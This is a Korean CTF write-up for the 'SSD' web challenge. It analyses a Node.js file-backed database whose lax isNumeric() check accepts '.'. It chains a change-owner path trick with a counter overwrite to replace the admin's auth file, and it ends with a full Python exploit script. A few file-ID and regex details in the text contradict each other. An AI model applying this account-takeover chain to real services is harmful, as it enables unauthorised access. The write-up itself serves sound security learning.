# SSD

## Usage

- SSD CTF 2025

## Concept

- Improper Input Validation
- Logic Bug

# Writeup

### Requirements

- Brain

## TLDR

1. isNumeric()에서 검증이 불충분하여 `.`도 숫자로 인식합니다.

2. Counter파일을 덮어서 `getNextId()`를 오작동하게 할 수 있습니다.

3. flag가 저장된 파일(1)은 그대로 유지한 채, auth가 저장된 파일(0)만 덮어서 flag를 읽을 수 있습니다.

## Analysis

파일로 데이터 베이스가 구현되어있는 HDD 서비스입니다.


```Dockerfile
FROM node:18-slim

RUN useradd -m ctf

WORKDIR /app

COPY app/package*.json ./
RUN npm install
RUN npm install -g pm2

COPY app .

RUN chown -R ctf:ctf /app && chmod 700 /app

USER ctf

EXPOSE 3000

CMD ["pm2-runtime", "start", "src/index.js", "--restart-delay=300000"]
```

Dockerfile을 보면 pm2를 통해 `src/index.js`를 300초마다 재시작하도록 설정합니다. (300000ms)

### db.js

서비스를 훑어보았을 때 `db.js`를 많이 로드하여 사용하기에 먼저 분석해보도록 하겠습니다.

```js
const path = require("path");
const fs = require("fs");

const DB_FOLDER = path.join(__dirname, process.env.DB_FOLDER ?? "database");

if (fs.existsSync(DB_FOLDER))
  fs.rmdirSync(DB_FOLDER, { force: true, recursive: true });
fs.mkdirSync(DB_FOLDER);
const DB_COUNTER_FILE = path.join(DB_FOLDER, "0");
fs.writeFileSync(DB_COUNTER_FILE, "0");

function isNumeric(v) {
  return typeof v == "string" && (/^-?\d+$/.test(v) || /^(\.|\d)+$/.test(v));
}

const assert = (v, cb) => (cb(v) ? "" : new Error("Assertion Failed"));

...

module.exports = {
  DB_FOLDER,
  write,
  read,
  update,
  remove,
  change_owner,
  getNextId,
  exist,
};
```

`db.js`는 DB_FOLDER에 파일들을 저장합니다.

사용할 수 있는 기능으로는 write, read, update, remove, change_owner, getNextId, exist가 있습니다.

`getNextId()`는 카운터 파일(0)에 있는 값을 읽어서 다음으로 사용될 ID값을 반환해줍니다.

**write()**

```js
function write({ user_id, data_id, data }) {
  assert(user_id, isNumeric) || assert(data, (v) => typeof v == "string");

  const USER_FOLDER = path.join(DB_FOLDER, user_id);
  if (!fs.existsSync(USER_FOLDER)) fs.mkdirSync(USER_FOLDER);

  if (!data_id) {
    data_id = getNextId(USER_FOLDER);
  } else {
    getNextId(USER_FOLDER); // counter++;
    assert(data_id, isNumeric);
  }

  const OUTPUT_PATH = path.join(USER_FOLDER, data_id);

  fs.writeFileSync(OUTPUT_PATH, data);

  return data_id;
}
```

write함수는 `user_id`와 `data_id`, `data`를 인자로 받고 `DB_FOLDER/{user_id}/{data_id}`위치에 data 값을 씁니다.

`data_id`를 입력하지 않는다면 `getNextId()`를 통해 다음 data를 쓸 위치를 지정합니다.

**read()**

```js
function read({ user_id, data_id }) {
  assert(user_id, isNumeric) || assert(data_id, isNumeric);

  const FILE_PATH = path.join(DB_FOLDER, user_id, data_id);
  if (!fs.existsSync(FILE_PATH)) throw new Error("File not found");

  return fs.readFileSync(FILE_PATH, "utf8");
}
```

`read` 함수는 `user_id`와 `data_id`를 인자로 받아  
`DB_FOLDER/{user_id}/{data_id}` 경로의 파일을 읽어 문자열로 반환합니다.  
만약 해당 파일이 존재하지 않는다면 `"File not found"` 에러를 발생시킵니다.

---

**update()**

```js
function update({ user_id, data_id, newData }) {
  assert(user_id, isNumeric) ||
    assert(data_id, isNumeric) ||
    assert(newData, (v) => typeof v == "string");

  const FILE_PATH = path.join(DB_FOLDER, user_id, data_id);
  if (!fs.existsSync(FILE_PATH)) throw new Error("File not found");

  fs.writeFileSync(FILE_PATH, newData);
}
```

`update` 함수는 `user_id`, `data_id`, `newData`를 인자로 받아  
기존에 존재하는 파일의 내용을 새로운 문자열(`newData`)로 덮어씁니다.  
대상 파일이 존재하지 않는다면 `"File not found"` 에러를 발생시킵니다.

---

**remove()**

```js
function remove({ user_id, data_id }) {
  assert(user_id, isNumeric) || assert(data_id, isNumeric);

  const FILE_PATH = path.join(DB_FOLDER, user_id, data_id);
  if (!fs.existsSync(FILE_PATH)) throw new Error("File not found");

  fs.unlinkSync(FILE_PATH);
}
```

`remove` 함수는 `user_id`와 `data_id`를 인자로 받아  
`DB_FOLDER/{user_id}/{data_id}` 경로의 파일을 삭제합니다.  
대상 파일이 존재하지 않으면 `"File not found"` 에러를 발생시킵니다.

---

**change_owner()**

```js
function change_owner({ old_user_id, new_user_id, data_id }) {
  assert(old_user_id, isNumeric) ||
    assert(new_user_id, isNumeric) ||
    assert(data_id, isNumeric);

  const OLD_PATH = path.join(DB_FOLDER, old_user_id, data_id);
  if (!fs.existsSync(OLD_PATH)) throw new Error("File not found");

  if (new_user_id == "0") throw new Error("No admin");
  const NEW_USER_FOLDER = path.join(DB_FOLDER, new_user_id);
  if (!fs.existsSync(NEW_USER_FOLDER)) throw new Error("User not found");

  const NEW_USER_AUTH_PATH = path.join(NEW_USER_FOLDER, "1");
  if (fs.lstatSync(NEW_USER_AUTH_PATH).isFile())
    throw new Error("User already exists");

  const NEW_PATH = path.join(NEW_USER_FOLDER, data_id);
  fs.renameSync(OLD_PATH, NEW_PATH);
}
```

`change_owner` 함수는 `old_user_id`, `new_user_id`, `data_id`를 인자로 받아  
기존 소유자(`old_user_id`)의 데이터 파일을 새로운 사용자(`new_user_id`) 디렉토리로 이동시킵니다.

- `old_user_id`에 해당하는 파일이 존재하지 않으면 `"File not found"` 에러 발생
- `new_user_id`가 `"0"`인 경우 `"No admin"` 에러 발생
- 새로운 사용자 디렉토리가 없거나 특정 인증 파일 구조가 올바르지 않으면 에러 발생
- 조건이 충족되면 `fs.renameSync`를 통해 파일을 이동시킵니다.

---

**exist()**

```js
function exist({ user_id, data_id }) {
  assert(user_id, isNumeric) || assert(data_id, isNumeric);

  const USER_FOLDER = path.join(DB_FOLDER, user_id);
  if (!fs.existsSync(USER_FOLDER)) return false;

  const FILE_PATH = path.join(USER_FOLDER, data_id);
  return fs.existsSync(FILE_PATH);
}
```

`exist` 함수는 `user_id`와 `data_id`를 인자로 받아  
`DB_FOLDER/{user_id}/{data_id}` 경로에 파일이 존재하는지 여부를 **불리언 값**으로 반환합니다.

### index.js

```js
...

app.use(express.json());
app.use(cookieParser());

app.use('/api/auth', limiter, authAPI);
app.use('/api/hdd', hddAPI);

...

app.listen(
    process.env.PORT ?? 3000,
    () => {
        const db = require('./db');
        db.write({
            user_id: '1',
            data: JSON.stringify({
                id: '1',
                username: process.env.ADMIN_USERNAME,
                password: process.env.ADMIN_PASSWORD
            })
        });
        db.write({
            user_id: '1',
            data: process.env.FLAG ?? 'SSD{REDACTED}'
        });
    }
)
```

`index.js`에서는 ADMIN 계정을 초기화해 줍니다.

초기화된 ADMIN 계정은 아래와 같이 저장됩니다.

```
database/
  1/
    0 -> {"id": "1", "username":"admin", "password":"..."}
    1 -> SSD{REDACTED}
```

`.env`에 ADMIN_USERNAME과 ADMIN_PASSWORD가 주어지지만 hash된 값이므로 크랙할 수 없습니다.

```conf
ADMIN_USERNAME=ADMIN
ADMIN_PASSWORD=$2b$10$2.kiJwz0TAnxEifX8nTYJ.GRfEG4TmZpY.AMwRc.wvDH3MRCHaBvS
```

플래그가 ADMIN 계정에 저장되어 있으므로 이 챌린지의 목표는 ADMIN으로 FLAG를 읽는 것입니다.

### API

`/api/auth`에 로그인/회원가입 기능이 구현되어있고, `/api/hdd`에 데이터베이스 CRUD가 구현되어 있습니다.

**authAPI**

```js
router.post(
  "/register",
  typeGuard({
    username: String,
    password: String,
  }),
  async (req, res) => {
    const { username, password } = req.body;

    if (username == "admin") return res.sendStatus(401);

    const user_id = db.getNextId(db.DB_FOLDER);

    try {
      const hashedPassword = await bcrypt.hash(password, 10);
      const user = {
        id: user_id,
        username,
        password: hashedPassword,
      };
      db.write({
        user_id: user_id,
        data_id: "1",
        data: JSON.stringify(user),
      });
      res.status(201).json({ message: "회원가입 성공", user_id });
    } catch (err) {
      console.log(err);
      res.status(500).json({ message: "서버 오류" });
    }
  }
);

router.post(
  "/login",
  typeGuard({
    user_id: String,
    password: String,
  }),
  async (req, res) => {
    const { user_id, password } = req.body;
    try {
      if (!db.exist({ user_id, data_id: "1" })) return res.status(401);
      const user = db.read({ user_id, data_id: "1" });
      const parsed = JSON.parse(user);

      const isMatch = await bcrypt.compare(password, parsed.password);
      if (!isMatch) {
        return res.status(401);
      }
      const token = jwt.sign(
        { id: parsed.id, username: parsed.username, email: parsed.email },
        SECRET_KEY,
        { expiresIn: "1h" }
      );
      res.json({ message: "로그인 성공", token });
    } catch (err) {
      console.log(err);
      res.status(500).json({ message: "서버 오류" });
    }
  }
);
```

회원가입 시 username과 password를 받아 username과 hashedPassword를 저장하고, user_id를 반환합니다.

user는 파일에 실제로 저장될 때 다음과 같이 저장됩니다.

```
database/
  ...
  2/
    0 -> {"id":"2", "username":"guest", "password": "..."}
```

**hddAPI**

hddAPI에는에는 `db.js`의 기능을 사용할 수 있도록 엔드포인트가 구현되어 있습니다.

```js
router.post(
  "/write",
  authMiddleware,
  typeGuard({ data: String, data_id: String }),
  (req, res) => {
    try {
      const { data, data_id } = req.body;
      const id = db.write({ user_id: req.user.id, data_id, data });
      res.json({ message: "Data written", data_id: id });
    } catch (err) {
      res.status(400).json({ error: err.message });
    }
  }
);

router.get("/read/:user_id/:data_id", authMiddleware, (req, res) => {
  try {
    const { user_id, data_id } = req.params;

    if (user_id != req.user.id && req.user.username != "admin")
      return res.sendStatus(403);

    const data = db.read({ user_id, data_id });
    res.json({ data });
  } catch (err) {
    res.status(404).json({ error: err.message });
  }
});

router.put(
  "/update",
  authMiddleware,
  typeGuard({ data_id: String, newData: String }),
  (req, res) => {
    try {
      const { data_id, newData } = req.body;
      db.update({ user_id: req.user.id, data_id: data_id, newData });
      res.json({ message: "Data updated" });
    } catch (err) {
      res.status(400).json({ error: err.message });
    }
  }
);

router.delete(
  "/remove",
  authMiddleware,
  typeGuard({ data_id: String }),
  (req, res) => {
    try {
      const { data_id } = req.body;
      db.remove({ user_id: req.user.id, data_id: data_id });
      res.json({ message: "Data removed" });
    } catch (err) {
      res.status(400).json({ error: err.message });
    }
  }
);

router.put(
  "/change-owner",
  authMiddleware,
  typeGuard({ new_user_id: String, data_id: String }),
  (req, res) => {
    try {
      const { new_user_id, data_id } = req.body;
      db.change_owner({
        old_user_id: req.user.id,
        new_user_id: new_user_id,
        data_id: data_id,
      });
      res.json({ message: "Owner changed" });
    } catch (err) {
      res.status(400).json({ error: err.message });
    }
  }
);
```

`/write`, `/update`, `/remove`, `/read`, `/change-owner`에서 모두 req.user.id를 user_id로 사용하여서 자신의 파일 외의 파일에 대한 접근을 제한합니다.

## Solution

### 1. isNumeric()에서의 검증 불충분

```js
function isNumeric(v) {
  return typeof v == "string" && (/^-?\d+$/.test(v) || /^(\.|\d)+$/.test(v));
}
```

`db.js`의 `isNumeric()`함수는 위와 같이 동작합니다.

그런데 두번째 정규표현식을 보면 `/^(\.|\d)?(\d)*$/`입니다.

- `^` : 시작한다.
- `(\.|\d)+` : `.`또는 숫자가 1개 이상 들어갈 수 있습니다.
- `$` : 끝난다.

따라서 `.`만 들어가도 숫자로 인식하게 됩니다.

대부분의 코드에서 `data_id` 검증을 `isNumeric()`을 사용하기 때문에 취약한 부분을 찾아볼 수 있습니다.

그중에서 `/change-owner`에서 `new_user_id`에 `.`이 들어가는 상황을 생각해보겠습니다.

```js
function change_owner({ old_user_id, new_user_id, data_id }) {
  assert(old_user_id, isNumeric) ||
    assert(new_user_id, isNumeric) ||
    assert(data_id, isNumeric);

  const OLD_PATH = path.join(DB_FOLDER, old_user_id, data_id); // [1]
  if (!fs.existsSync(OLD_PATH)) throw new Error("File not found");

  if (new_user_id == "0") throw new Error("No admin");
  const NEW_USER_FOLDER = path.join(DB_FOLDER, new_user_id); // [2]
  if (!fs.existsSync(NEW_USER_FOLDER)) throw new Error("User not found");

  const NEW_USER_AUTH_PATH = path.join(NEW_USER_FOLDER, "1");
  
  if (fs.lstatSync(NEW_USER_AUTH_PATH).isFile())
    throw new Error("User already exists");
  const NEW_PATH = path.join(NEW_USER_FOLDER, data_id);
  fs.renameSync(OLD_PATH, NEW_PATH); // [3]
}
```

**[1]**에서 나의 파일을 하나 지정합니다.

**[2]**에서 NEW_USER_FOLDER는 `path.join(DB_FOLDER, '.')`을 하면 `DB_FOLDER`와 같아집니다.

그렇다면 내가 업로드한 파일을 `DB_FOLDER`로 이동시킬 수 있습니다.

### 2. Counter 파일 덮어쓰기

`/api/hdd/update`에서는 `data_id`에 대한 추가적인 제약이 없기 때문에 `data_id`를 0으로 준다면 Counter로 사용되는 값을 덮을 수 있고, `genNextId()`를 이상하게 동작하게 할 수 있습니다.

또한 `DB_FOLDER`에도 `user_id`를 관리하기 위한 Counter가 존재합니다. (`genNextId(DB_FOLDER)`에서 사용됨.)

```
database/
  0 -> 다음에 사용할 user_id
```

그렇다면 "isNumeric()에서의 검증 불충분"과 `/api/hdd/update`를 이용한다면 `DB_FOLDER/0`을 덮어서 Counter를 덮을 수 있게 됩니다.

3. ADMIN 계정 덮어쓰기

또한 회원가입시에는 `db.getNextId(DB_FOLDER)`로 `user_id`를 정합니다.

```js
const user_id = db.getNextId(db.DB_FOLDER);

try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = {
        id: user_id,
        username,
        password: hashedPassword
    };
    db.write({
        user_id: user_id,
        data_id: "1",
        data: JSON.stringify(user)
    });
    ...
```

그렇다면 "Counter 파일 덮어쓰기"를 이용하여 DB_FOLDER의 Counter를 덮어쓴다면 ADMIN의 데이터가 저장된 폴더(`database/1`)에서 FLAG는 보존한 채 인증 정보가 저장된 파일(`database/1/1`)만 덮어쓸 수 있게됩니다.

공격 전과 공격 후의 `database/1`의 상황을 시각화하면 아래와 같습니다.

**공격 전**
```
database/
  1/
    0 -> {"id": "1", "username":"admin", "password":"..."}
    1 -> SSD{REDACTED}
```

**공격 후**
```
database/
  1/
    0 -> {"id": "1", "username":"attacker", "password":"attacker's hashed password"}
    1 -> SSD{REDACTED}
```

이제 Login 후 FLAG를 읽을 수 있습니다.

## Exploit

```py
import requests as req
import hashlib

url = 'http://localhost:3000'


res = req.post(f'{url}/api/auth/register', json={
    'username': 'guest',
    'password': 'guest',
})
user_id = res.json().get('user_id')

res = req.post(f'{url}/api/auth/login', json={
    'user_id': '2',
    'password': 'guest'
})
token = res.json().get('token')
headers = {
    "authorization": f"Bearer {token}"
}

res = req.put(f'{url}/api/hdd/update', json={
    "data_id": "0", "newData": "0"
}, headers=headers)

res = req.put(f'{url}/api/hdd/change-owner', json={
    "new_user_id": ".", "data_id": "0"
}, headers=headers)

res = req.post(f'{url}/api/auth/register', json={
    'username': 'guest',
    'password': 'guest',
})

res = req.post(f'{url}/api/auth/login', json={
    'user_id': '1',
    'password': 'guest',
})
token = res.json().get('token')
headers = {
    "authorization": f"Bearer {token}"
}

res = req.get(f'{url}/api/hdd/read/1/2', headers=headers)
print(res.text)
```
